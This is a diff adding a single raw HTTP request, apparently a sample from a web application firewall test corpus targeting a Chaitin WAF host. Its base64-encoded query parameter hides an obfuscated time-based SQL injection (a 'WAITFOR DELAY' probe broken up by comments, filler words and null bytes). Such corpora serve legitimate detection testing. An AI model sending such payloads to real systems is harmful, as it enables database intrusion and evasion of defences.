@@ -1,0 +1,13 @@
+POST /implicit/policy/module/concurrent?workaround=KSk7d0FpVEZPciMgY29uc3RydWN0b3JzZW5hYmxlZGNoYXJzZXRkb3VibGVsaW5lYXJyZWdpb25zIAovKiBibHVyCmNsaXBib2FyZHByZXBhcmVtb3VudGVkdW5iaW5kc21hbGx3cml0YWJsZXBvc2l0aW9uc3dhbGsgKi9ERUxBWQAvKiANICovJzA6MDo1Jy0t HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0
+Cookie: rectify=DOM; SESSIONID=bbec8f81530df359072c14fd3570d77dee793cfb8e3d11e779b8b64245885a79daf288a7a45ff90058170a60d006e2c9
+
